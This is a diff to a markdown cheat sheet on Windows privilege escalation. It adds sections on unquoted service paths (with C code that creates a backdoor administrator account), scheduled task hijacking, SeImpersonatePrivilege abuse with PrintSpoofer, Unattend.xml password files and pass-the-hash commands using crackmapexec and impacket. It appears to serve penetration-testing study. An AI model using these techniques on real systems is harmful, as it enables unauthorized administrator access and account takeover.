@@ -104,6 +104,22 @@ The default filename is `PowerShell_transcript.<computername>.<random>.<timestam
 
 ---
 
+## Password in configuration file (Unattend.xml)
+
+An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
+
+```sh
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.xml
+C:\Windows\system32\sysprep\sysprep.xml
+```
+
+Extract password and decode it (from base64)
+
+---
+
 ## Find password manager database
 
 E.g. search `*.kdbx`
@@ -298,6 +314,130 @@ When the service restarts, it may load your malicious DLL instead of the legitim
 
 ---
 
+## Unquoted Service Paths
+
+When a **Windows service** is installed with an **unquoted path** and the path contains **spaces**, Windows does **not know where the executable truly begins and ends** unless quotes (`"`) are used. It will **try to execute each potential path segment** until it finds a matching file. If one of these path segments is **writable by a low-privilege user**, you can place a **malicious executable** there, which will get executed with **SYSTEM privileges** the next time the service starts.
+
+{{< details summary="What Windows will try to do" >}}
+Suppose a Windows service is registered like this:
+
+```dos
+C:\Program Files\My App\bin\service.exe
+```
+
+Notice that the path has spaces and is not enclosed in quotes.
+
+Here's what Windows will try to do:
+Windows tries to execute the following, in this order:
+* `C:\Program.exe`
+* `C:\Program Files\My.exe`
+* `C:\Program Files\My App\bin\service.exe` (this is the real one)
+
+If `C:\Program Files\My App\bin\service.exe` doesn't exist, you can place a file called `C:\Program.exe`, that will get executed instead, with SYSTEM privileges.
+
+{{< /details >}}
+
+**To exploit this**:
+* There must be an `unquoted service path` with spaces in it.
+
+```dos
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+* One of the earlier-resolved paths must be `writable` by a low-privileged user. To check access rights, use `icacls` in each path. 
+* You must be able to `create a malicious executable` in that path.
+
+```C
+#include <stdlib.h>
+int main ()
+  {
+    int i;
+    i = system ("net user testuser somepassword /add");
+    i = system ("net localgroup administrators testuser /add");
+  }
+```
+
+* The service must `restart` (manually or through a system reboot).
+
+
+---
+
+## Scheduled Tasks
+
+Scheduled Tasks (a.k.a. Task Scheduler) are Windows components that let administrators schedule programs or scripts to **run automatically** at specific times or under certain conditions (like at login, boot, idle, etc.).
+
+If a task runs something like:
+
+```xml
+<Action>
+  <Exec>
+    <Command>C:\Scripts\Backup.bat</Command>
+  </Exec>
+</Action>
+```
+
+… and `C:\Scripts\Backup.bat` is **writable by a low-priv user**, you can overwrite it with a malicious payload.
+
+**To exploit this**:
+
+1. We can view scheduled task with the following command:
+```powershell
+schtasks /query /fo LIST /v
+```
+
+Look for tasks with interesting information in the `Task To Run`, `Run As User`, `Next Run Time`, `Author` fields.
+
+2. If you find a task running under a **high-privilege user**, check the permissions on the file it executes using `icalcs`.
+
+3. **Replace the executable file** specified in the action of the scheduled task.
+
+4. **Wait for the task to run**
+
+---
+
+## SeImpersonatePrivilege
+
+`SeImpersonatePrivilege` is a Windows security privilege that allows a process to impersonate another user or process after authentication.
+
+This privilege is commonly assigned to services and processes that need to act on behalf of users (for example, IIS).
+By default, Local System, Network Service, Local Service, and some authenticated services have this privilege.
+
+**To exploit this**:
+
+{{< details summary="PrintSpoofer.exe" >}}
+
+This works on **Windows 10** and **Server 2016/2019** https://github.com/itm4n/PrintSpoofer
+
+1. Verify privileges:
+
+```powershell
+whoami /priv
+```
+Look for:
+
+```powershell
+Privilege Name                Description                    State
+============================  =============================  ========
+SeImpersonatePrivilege        Impersonate a client after...  Enabled
+```
+
+2. Copy the executable of PrintSpoofer.exe from [PrintSpoofer repository](https://github.com/itm4n/PrintSpoofer).
+
+3. Execute it:
+
+```powershell
+.\PrintSpoofer64.exe -i -c cmd
+```
+Troubleshooting: https://juggernaut-sec.com/seimpersonateprivilege/#Troubleshooting_PrintSpoofer_Errors
+Blog post: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
+{{< /details >}}
+
+{{< hint style=notes >}}
+**Note**: There are other tools available to accomplish this, such as **Juicy Potato**, **Rogue Potato**, etc.
+{{< /hint >}}
+
+---
+
 ## UAC Bypass
 
 User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
@@ -347,7 +487,7 @@ list_tokens -u
 ```sh
  Delegation Tokens Available
  ========================================
- ATTACKDEFENSE\Administrator
+ ANYTHING\Administrator
  NT AUTHORITY\LOCAL SERVICE
  
  Impersonation Tokens Available
@@ -373,29 +513,19 @@ migrate 2948
 
 ---
 
-## Password in configuration file (Unattend.xml)
-
-An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
-
-```sh
-C:\unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.xml
-C:\Windows\system32\sysprep\sysprep.xml
-```
-
-Extract password and decode it (from base64)
-
----
-
 ## Pass the Hash
 
+Pass-the-Hash is a technique where you authenticate as a user without knowing the plaintext password. Instead, you can use the NTLM hash of the password to gain access to systems and resources.
+
+
 ```sh
-# 1. Method
+# 1. with crackmapexec
 crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"
 
-# 2. Method (Metasploit) -> windows/smb/psexec
+# 2. with psexec (impacket)
+impacket-psexec -hashes <LM hash>:<NTLM hash> Administrator@<ip>
+
+# 3. Method (Metasploit) -> windows/smb/psexec
 set SMBPass <LM hash>:<NTLM hash>
 ```
 
@@ -416,7 +546,6 @@ set SMBPass <LM hash>:<NTLM hash>
   * runas /savecred /user:admin cmd.exe
 * Scheduled Tasks
 * Insecure Permissions on Service Executable
-* Unquoted Service Paths
 * Insecure Service Permissions
 * Windows Privileges
 * Unpatched Software
